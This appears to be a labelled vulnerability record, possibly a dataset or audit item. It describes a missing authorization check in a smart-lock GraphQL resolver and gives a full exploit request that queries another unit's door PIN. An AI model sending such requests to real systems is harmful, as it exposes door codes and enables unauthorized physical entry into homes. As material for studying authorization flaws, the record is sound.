diagnosis: The smart-lock passcode resolver utilizes a DataLoader to retrieve door lock credentials. Because it fails to check that info.context['current_user'] is the verified property owner or active tenant for lock_id, any authenticated user can query door PIN codes and obtain unauthorized physical entry to rental properties or facilities.
exploit_request:
POST /graphql HTTP/1.1
Host: iot.smarthomehub.io
Authorization: Bearer <tenant_jwt>
Content-Type: application/json

{"query": "query { activeDoorPasscode(lockId: \"lock_apt_penthouse_4B\") { lockId doorPin expiresAt } }"}
